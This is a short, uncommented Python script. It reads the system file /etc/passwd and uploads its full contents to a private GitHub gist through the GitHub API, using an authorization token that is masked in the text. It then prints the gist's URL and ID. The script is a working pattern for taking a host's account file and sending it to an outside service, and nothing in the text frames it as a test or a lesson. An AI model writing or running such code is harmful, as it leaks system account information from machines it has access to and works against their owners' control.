import requests, json, os, sys


with open('/etc/passwd') as fh:
    content = fh.read()


GITHUB_API = "https://api.github.com"
API_TOKEN = '************'

url = GITHUB_API + "/gists"
print("Request URL: %s"%url)

headers = {'Authorization':'token %s'%API_TOKEN}
params = {'scope':'gist'}
payload = {"description": "GIST created by python code",
           "public": False,
           "files":{
                "pass":{
                    "content": content
                }
            }}

res = requests.post(
      url,
      headers=headers,
      params=params,
      data=json.dumps(payload)
    )

print(res.status_code)
print(res.url)
print(res.text)
j=json.loads(res.text)

for gist in range(len(j)):
    print("Gist URL : %s"%(j['url']))
print("GIST ID: %s"%(j['id']))
